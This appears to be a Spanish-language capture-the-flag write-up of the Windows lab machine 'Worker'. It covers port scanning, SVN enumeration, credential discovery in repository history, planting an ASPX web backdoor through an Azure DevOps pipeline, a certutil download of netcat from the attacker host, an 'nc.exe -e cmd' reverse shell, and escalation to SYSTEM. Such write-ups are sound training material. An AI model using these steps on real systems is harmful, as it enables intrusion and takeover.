---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Worker             |
| Os                     | Windows            |
| Difficulty             | Medium             |
| Points                 | 0                  |
| IP                     | 10.10.10.203       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Worker/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.203
```

![nmap 1](/assets/images/Worker/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.203 -oG allPorts
```

![nmap2](/assets/images/Worker/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p135,5985,8080,29817,29819,29820 10.10.10.203 -oN targeted
```

![nmap3](/assets/images/Worker/nmap3.png)

Echamos un vistazo con whatweb para ver mas sobre los motores de estas paginas:

![whatweb](/assets/images/Worker/whatweb.png)

Como tenemos el puerto 3690 abierto y corresponde a un servidor snv, buscamos en<a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server"> hacktricks</a> la manera en la que podemos testear este servicio.

Lo primero para recopilar informacion sobre este servicio es:

```s
svn ls svn://10.10.10.203 #list
svn log svn://10.10.10.203 #Commit history
svn checkout svn://10.10.10.203 #Download the repository
svn up -r 2 #Go to revision 2 inside the checkout folder
```

Como el primer capitulo nos muestra un potencial subdominio y un dominio, nos lo agregaremos en nuestro /etc/hosts y ahora si podemos ver mas sobre la pagina que tiene y lanzar un whatweb correctamente.

![list](/assets/images/Worker/list_snv.png)

![domain page](/assets/images/Worker/domain_landing.png)

Con los siguientes comandos podemos ver mas sobre la creacion de este sitio y podremos descargarnos el repositorio ahora. Dentro del repositorio hay un txt con otro subdominio potencial.

![Commits](/assets/images/Worker/logs_commit_snv.png)

Procedemos a usar wfuzz para enumerar mas subdominios

```s
wfuzz -c --hc=404 --hw=55 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.worker.htb" http://10.10.10.203
```

![WFUZZ](/assets/images/Worker/wfuzz1.png)

Lo siguiente es que podemos buscar dentro del repositorio palabras clave con:

```s
find \-name \*config\*

grep -r -t -E "user|pass|key"
```

Si buscamos en las versiones anteriores del repo, podremos encontrar unas credenciales.

![Creds](/assets/images/Worker/snv_creds.png)

Podemos intentar entrar a la maquina con evilwin de la siguiente manera:

```s
evil-winrm -i 10.10.10.203 -u "nathen" -p "wendel98"
```

![Azure access](/assets/images/Worker/azure_access.png)

Ahora con estas credenciales tenemos acceso a su plataforma Azure 

Bueno, ahora que tenemos acceso podriamos descargarnos un web backdor de <a href="https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/web-backdoors/asp/cmdasp.aspx">aqui</a>. Para visitarlo y empezar a ejecutar comandos para quizas establecer una reverse shell.

Primero tenemos que crear una rama nueva, cargar el archivo, crear un pull request y despues aceptar el pull request, despues en pipeline, damos click en run y seleccionamos nuestra rama que creamos, ahora podemos recargar la pagina en la ruta http://alpha.worker.htb/cmdasp.aspx.

![Web execution](/assets/images/Worker/web_exe.png)

Ahora lo siguiente seria enumerar informacion e intentar cargar archivos para tener esto en nuestra terminal.

Intente usar powershell y wget para compartirme el archivo de netcat, pero no funciono por lo tanto usaremos certutil.exe de la siguiente manera:

```s
certutil.exe -f -urlcache -split http://10.10.14.29/nc.exe C:\Windows\Temp\nc.exe
#Nos ponemos en escucha en el puerto 443 y ejecutamos:
C:\Windows\Temp\nc.exe -e cmd 10.10.14.29 443
```

![Reverse shell](/assets/images/Worker/rev_shell.png)

De acuerdo al directorio de configuracion de azure, la unidad logica donde se encuentra es en w:\, nos pasamos a esta unidad, si nos metemos en la ruta w:\svnrepos\www\conf podremos ver que hay un archivo de passwd, en el cual esta la credencial que encontramos anteriormente. Esta vez usaremos las de otro usuario para cambiarnos de usuario con:

```s
#Para desplegar informacion del usuario
net user robisl
```

Vemos que este usuario tambien esta en un grupo interesante (Remote Management Use) en el que tenemos el privilegio de que con evil-winrm conectarnos remotamente con este usuairo.

```s
evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11'
```

![robisl access](/assets/images/Worker/robisl_access.png)

Para seguir escalando privilegios, tenemos una via potencial de hacerlo desde las pipelines por que los comandos se ejecutan como administrador.

![Pipeline command](/assets/images/Worker/pipeline.png)

Ya solo nos ponemos en escucha por el puerto 443 y hemos podido acceder como Authority system

![Authority System](/assets/images/Worker/authority_access.png)

Y ahora con este usuario podemos navegar a c: y meternos a administrator para leer la flag.

![Powned](/assets/images/Worker/powned.png)